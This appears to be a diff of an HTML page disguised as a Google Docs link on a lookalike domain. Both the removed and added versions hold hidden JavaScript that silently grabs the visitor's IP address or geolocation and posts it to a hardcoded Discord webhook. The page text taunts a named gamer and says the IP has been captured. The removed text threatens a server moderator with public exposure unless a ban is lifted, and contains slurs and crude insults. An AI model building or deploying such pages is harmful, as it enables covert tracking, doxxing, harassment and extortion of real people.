@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Appeal proof</title>
-    <meta content="All the proof you need.docx" property="og:title" />
-    <meta content="I got banned by one of your moderators, and also accused of being a zoo. Heres all the proof that none of us are zoos" property="og:description" />
+    <meta content="data.docx" property="og:title" />
+    <meta content="hello duckietheredrighthand. You have recent..." property="og:description" />
     <meta content="https://googIedocs.github.io" property="og:url" />
     <meta content="#43B581" data-react-helmet="true" name="theme-color" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -60,73 +60,37 @@
 
 </head>
 <body><script>
-    $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=b0da4c0541ba45fdbe50a45d77dbff7e", function(data) { //Make sure to use this api or use another but you got to change the values down below
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1170457387518398494/VqFIUh3Jb4JL4Q8rkxHlG5Dw518o4pXnCNZSKWPTFJD5HoM2MTK-YxeLMShdx33RCUy-");
-  
-    request.setRequestHeader('Content-type', 'application/json');
-    var t = {
-      username: "Coochie bot",
-      avatar_url: "https://www.origo.hu/i/1305/20130509-fogonosz-semion-mogilevich-orosz-maffiozo.jpg",
-      content: "",
-      embeds: [{
-          color: "4700374",
-          title: "Gripped",
-          fields: [
-            {name: "Ip", value: JSON.stringify(data)},
-          ],
-         
-      }]
-  };
-  
-    request.send(JSON.stringify(t));
-})
+    function getIP(json) {
+        console.log("My public IP address is: ", json.ip);
+    function sendMessage() {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1170457387518398494/VqFIUh3Jb4JL4Q8rkxHlG5Dw518o4pXnCNZSKWPTFJD5HoM2MTK-YxeLMShdx33RCUy-");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "My Webhook Name",
+        avatar_url: "",
+        content: json.ip,
+      }
+
+      request.send(JSON.stringify(params));
+    }
+    sendMessage()
+}
 </script>
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
     <br>
     <h1>
-        Hey,
+        Hey, duckietheredrighthand
     </h1>
     <br><br>
     <hr width="60%">
-    <h2> Contents</h2>
-    <ol>
-        <li><a href="#a">The accusations.</a></li>
-        <li><a href="#b">Moderator's response</a></li>
-        <li><a href="#c">How i will shut you down</a></li>
-    </ol>
+    <h2>You little freak</h2>
     <hr width="60%">
     <p>
-        &nbsp;&nbsp;&nbsp;Me and my friends have been banned from this server, and we have all the reasons to say that we are actually innocent, and were <span class="hrred"> banned for no reason.</span> <br>
+        &nbsp;&nbsp;&nbsp;We played bedwars today and when you finally killed me you were so toxic about it... so here i am, getting back at you by finding your discord account. Also, by the time you have finished reading this, your ip address has been sent to me. Last word xoxo</span> <br>
     </p>
-        <h2> <a name="a"></a>
-            I. The accusations.
-        </h2>
-    <p>
-        &nbsp;&nbsp;&nbsp;Here i have the ban reasons that need to be discussed: <br> <br>
-        <br><img src="img/e1.png" alt="" width="60%"><br><br>
-        &nbsp;&nbsp;&nbsp;First of all, <span class="hrred">there was nothing related to "sexual relationships"</span>. The term that was used is "special connection". The horse is a pet, just like the dog or cat you have at home. <br>
-        &nbsp;&nbsp;&nbsp;Second of all, no one mentioned anything even remotely close to toasters, let alone <span class="hrred">make a religion out of having sex with them</span>
-    </p>
-    <p>
-        &nbsp;&nbsp;&nbsp; <br> <br>
-        <br><img src="img/e2.png" alt="" width="60%"><br><br>
-        &nbsp;&nbsp;&nbsp;Again, there was nothing sexual. <br><br>
-        <span class="hrred">&nbsp;&nbsp;&nbsp;Conclusion: Dont hire dyslexic assholes.</span>
-    </p>
-    <hr width="60%"><a name="b"></a>
-    <h2> II. Moderator's response</h2>
-    <p>
-        &nbsp;&nbsp;&nbsp;Here i have a screenshot from another user showing what the mod has said:<br> <br>
-        <br><img src="img/e3.png" alt="" width="60%"><br><br>
-        &nbsp;&nbsp;&nbsp;No one has said "how my horse makes me feel". No one was also talking about whatever "it" means suggestively.<br>
-        &nbsp;&nbsp;&nbsp;The server is tagged as "Furry" on multiple websites, meaning <span class="hrred"> that the moderator is not only dyslexic, but also hypocritic.</span>
-    </p>
-    <hr width="60%"><a name="c"></a>
-    <h2> III. How i will shut you down</h2>
-    <p>
-        &nbsp;&nbsp;&nbsp;I am 100% sure that you can see the deleted messages. We are the victims here, but sadly for you that might change. If i dont recieve an unban and an apology, i will have to <span class="hrred">post all of the shit your moderator did</span> and just say that you promote those types of things on my tiktok account with 760 thousand followers. Here is a gif showing that i actually have the account.<br><br>
-        <img src="img/gif.gif" alt="" width="60%"><br><br>
-        Also i would like to point out that by the time you have finished reading this, i already have your ip address.<br><br><br><br><br><br>
-    </p>
+
 </body>
 </html>
